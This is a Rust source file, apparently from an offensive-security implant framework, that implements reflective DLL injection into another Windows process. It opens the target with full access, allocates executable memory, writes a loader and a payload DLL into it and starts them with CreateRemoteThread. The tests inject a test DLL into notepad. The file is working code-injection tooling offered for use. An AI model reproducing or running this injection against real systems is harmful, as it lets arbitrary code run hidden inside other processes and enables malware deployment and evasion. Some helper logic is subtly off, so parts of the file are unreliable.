use std::{os::raw::c_void, ptr::null_mut};
use object::{Object, ObjectSection};
use object::LittleEndian as LE;

use starlark::values::none::NoneType;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::Threading::CreateRemoteThread;
use windows_sys::Win32::{System::{SystemServices::{IMAGE_DOS_HEADER}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory}, Threading::{OpenProcess, PROCESS_ALL_ACCESS, PROCESS_ACCESS_RIGHTS}, Memory::{VirtualAllocEx, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}}, Foundation::{GetLastError, BOOL, HANDLE, FALSE}};



fn get_u8_vec_form_u32_vec(u32_vec: Vec<u32>) -> anyhow::Result<Vec<u8>> {
    let mut should_err = false;
    let res_u8_vec: Vec<u8> = 
        u32_vec.iter().map(|x| if *x < u8::MAX as u32 { *x as u8 }else{ should_err = true; u8::MAX }).collect();
    if should_err { return Err(anyhow::anyhow!("Error casting eldritch number to u8. Number was too big."))}
    Ok(res_u8_vec)
}

// pub unsafe fn OpenProcess(dwdesiredaccess: PROCESS_ACCESS_RIGHTS, binherithandle: super::super::Foundation::BOOL, dwprocessid: u32) -> super::super::Foundation::HANDLE
fn open_process(dwdesiredaccess: PROCESS_ACCESS_RIGHTS, binherithandle: BOOL, dwprocessid: u32) -> anyhow::Result<HANDLE> {
    let process_handle: HANDLE = unsafe{ OpenProcess(dwdesiredaccess, binherithandle, dwprocessid) };
    if process_handle == 0 {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!("Failed to open process {}. Last error returned: {}", dwprocessid, error_code))
        }
    }
    Ok(process_handle)
}

// pub unsafe fn VirtualAllocEx(hprocess: super::super::Foundation::HANDLE, lpaddress: *const ::core::ffi::c_void, dwsize: usize, flallocationtype: VIRTUAL_ALLOCATION_TYPE, flprotect: PAGE_PROTECTION_FLAGS) -> *mut ::core::ffi::c_void
fn virtual_alloc_ex(hprocess: HANDLE, lpaddress: *const c_void, dwsize: usize, flallocationtype: VIRTUAL_ALLOCATION_TYPE, flprotect: PAGE_PROTECTION_FLAGS) -> anyhow::Result<*mut c_void> {
    let buffer_handle: *mut c_void = unsafe{ VirtualAllocEx(hprocess, lpaddress, dwsize, flallocationtype, flprotect) };
    if buffer_handle == null_mut() {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!("Failed to allocate memory. Last error returned: {}", error_code))
        }
    }
    Ok(buffer_handle)
}


// pub unsafe fn WriteProcessMemory(hprocess: super::super::super::Foundation::HANDLE, lpbaseaddress: *const ::core::ffi::c_void, lpbuffer: *const ::core::ffi::c_void, nsize: usize, lpnumberofbyteswritten: *mut usize) -> super::super::super::Foundation::BOOL
fn write_process_memory(hprocess: HANDLE, lpbaseaddress: *const c_void, lpbuffer: *const c_void, nsize: usize) -> anyhow::Result<usize> {
    let mut lpnumberofbyteswritten: usize = 0;
    let write_res = unsafe{ WriteProcessMemory(hprocess, lpbaseaddress, lpbuffer, nsize, &mut lpnumberofbyteswritten) };
    if write_res == FALSE || lpnumberofbyteswritten == 0 {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!("Failed to write process memory. Last error returned: {}", error_code))
        }
    }
    Ok(lpnumberofbyteswritten)
}

// fn CreateRemoteThread(hprocess: isize, lpthreadattributes: *const SECURITY_ATTRIBUTES, dwstacksize: usize, lpstartaddress: Option<fn(*mut c_void) -> u32>, lpparameter: *const c_void, dwcreationflags: u32, lpthreadid: *mut u32) -> isize
fn create_remote_thread(hprocess: isize, lpthreadattributes: *const SECURITY_ATTRIBUTES, dwstacksize: usize, lpstartaddress: Option<*mut c_void>, lpparameter: *const c_void, dwcreationflags: u32, lpthreadid: *mut u32) -> anyhow::Result<isize> {
    let tmp_lpstartaddress: Option<unsafe extern "system" fn(_) -> _> = match lpstartaddress {
        Some(local_lpstartaddress) => Some(unsafe { std::mem::transmute(local_lpstartaddress) }),
        None => todo!(),
    };
    let res = unsafe{CreateRemoteThread(hprocess, lpthreadattributes, dwstacksize, tmp_lpstartaddress, lpparameter, dwcreationflags, lpthreadid)};
    if res == 0 {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!("Failed to create remote thread. Last error returned: {}", error_code))
        }
    }
    Ok(res)
}

fn get_export_address_by_name(pe_bytes: &[u8], export_name: &str) -> anyhow::Result<usize> {
    let pe_file = object::read::pe::PeFile64::parse(pe_bytes)?;//object::File::parse(pe_bytes)?;

    let section = match pe_file.section_by_name(".text") {
        Some(local_section) => local_section,
        None => return Err(anyhow::anyhow!(".text section not found")),
    };

    let mut section_raw_data_ptr = 0x0;
    for section in pe_file.section_table().iter() {
        let section_name = String::from_utf8(section.name.to_vec())?;
        if section_name.contains(".text") {
            section_raw_data_ptr = section.pointer_to_raw_data.get(LE);
            break;
        }
    }
    let rva_offset = section.address() as usize - section_raw_data_ptr as usize - pe_file.relative_address_base() as usize;

    let exported_functions = pe_file.exports()?;
    for export in exported_functions {
        if export_name == String::from_utf8(export.name().to_vec())?.as_str() {
            return Ok(export.address() as usize - rva_offset - pe_file.relative_address_base() as usize);
        }
    }

    Err(anyhow::anyhow!("Function {} not found", export_name))
}

fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32) -> anyhow::Result<()>{
    let loader_function_name = "reflective_loader";

    let reflective_loader_dll = include_bytes!("..\\..\\..\\..\\bin\\reflective_loader\\target\\release\\reflective_loader.dll");
    
    let dos_header = reflective_loader_dll.as_ptr() as *mut IMAGE_DOS_HEADER;
    let nt_header = (reflective_loader_dll.as_ptr() as usize + (unsafe { *dos_header }).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    let image_size = (unsafe { *nt_header }).OptionalHeader.SizeOfImage;

    let process_handle = open_process(
        PROCESS_ALL_ACCESS, 
        0, 
        pid)?;

    // Allocate and write loader to remote process
    let remote_buffer = virtual_alloc_ex(
        process_handle, 
        null_mut(), 
        image_size as usize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE)?;

    let _loader_bytes_written = write_process_memory(
        process_handle, 
        remote_buffer as _, 
        reflective_loader_dll.as_ptr() as _, 
        image_size as usize)?;

    // Allocate and write payload to remote process
    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
        process_handle, 
        null_mut(), 
        target_dll_bytes.len() as usize,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE)?;
    
    let _payload_bytes_written = write_process_memory(
        process_handle, 
        remote_buffer_target_dll as _, 
        target_dll_bytes.as_slice().as_ptr() as _, 
        target_dll_bytes.len() as usize)?;

    // Find the loader entrypoint and hand off execution
    // entrypoint bytes: 41 57 41 56 41 55 41 54 56 57 55 53 48 81 EC B8 06 00 00 48 8B 51 08 48 89 8C 24 F8 00 00 00 4C 8B 41 10 48 8D B4 24 30 05 00 00 48 89 F1
    let loader_address_offset = get_export_address_by_name(
        reflective_loader_dll, 
        loader_function_name)?;
    let loader_address = loader_address_offset + remote_buffer as usize;

    let _thread_handle = create_remote_thread(
        process_handle,
        null_mut(),
        0,
        Some(loader_address as *mut c_void),
        remote_buffer_target_dll,
        0,
        null_mut(),
        );

    Ok(())
}

pub fn dll_reflect(dll_bytes: Vec<u32>, pid: u32) -> anyhow::Result<NoneType> {
    let local_dll_bytes = get_u8_vec_form_u32_vec(dll_bytes)?;
    handle_dll_reflect(local_dll_bytes, pid)?;
    Ok(NoneType)
}


#[cfg(target_os = "windows")]
#[cfg(test)]
mod tests {
    use super::*;

    use sysinfo::{System, SystemExt, Pid, PidExt, Signal, ProcessExt};
    use tempfile::NamedTempFile;
    use std::{process::Command, time, thread, path::Path, fs};


    #[test]
    fn test_dll_reflect_get_u8_vec_form_u32_vec_simple() -> anyhow::Result<()> {
        let test_input: Vec<u32> = vec![0, 2, 15 ];
        let expected_output: Vec<u8> = vec![0, 2, 15];
        let res = get_u8_vec_form_u32_vec(test_input)?;
        assert_eq!(res, expected_output);
        Ok(())
    }

    #[test]
    fn test_dll_reflect_get_u8_vec_form_u32_vec_fail() -> anyhow::Result<()> {
        let test_input: Vec<u32> = vec![0, 2, 16 ];
        let err_str = match get_u8_vec_form_u32_vec(test_input) {
            Ok(_) => "No error".to_string(),
            Err(local_err) => local_err.to_string(),
        };
        assert_eq!("No error".to_string(), err_str);
        Ok(())
    }

    #[test]
    fn test_dll_reflect_lookup_export() -> anyhow::Result<()> {
        let test_dll_bytes = include_bytes!("..\\..\\..\\..\\bin\\reflective_loader\\target\\release\\reflective_loader.dll");
        let loader_address_offset: usize = get_export_address_by_name(test_dll_bytes, "reflective_loader")?;
        assert_eq!(loader_address_offset, 0xBC0);
        Ok(())
    }

    #[test]
    fn test_dll_reflect_simple() -> anyhow::Result<()> {
        let test_dll_bytes = include_bytes!("..\\..\\..\\..\\bin\\create_file_dll\\target\\debug\\create_file_dll.dll");
        const DLL_EXEC_WAIT_TIME: u64 = 3;
        
        // Get unique and unused temp file path
        let tmp_file = NamedTempFile::new()?;
        let path = String::from(tmp_file.path().to_str().unwrap()).clone();
        tmp_file.close()?;

        // Out target process is notepad for stability and control.
        // The temp file is passed through an environment variable.
        let expected_process = Command::new("C:\\Windows\\System32\\notepad.exe").env("LIBTESTFILE", path.clone()).spawn();
        let target_pid = expected_process.unwrap().id();

        // Run our code.
        let _res = handle_dll_reflect(test_dll_bytes.to_vec(), target_pid)?;

        let delay = time::Duration::from_secs(DLL_EXEC_WAIT_TIME);
        thread::sleep(delay);

        // Test that the test file was created
        let test_path = Path::new(path.as_str());
        assert!(test_path.is_file());

        // Delete test file
        let _ = fs::remove_file(test_path);
        
        // kill the target process notepad
        let mut sys = System::new();
        sys.refresh_processes();
        match sys.process(Pid::from_u32(target_pid)) {
            Some(res) => {
                res.kill_with(Signal::Kill);
            },
            None => {
            },
        }
        Ok(())
    }
}
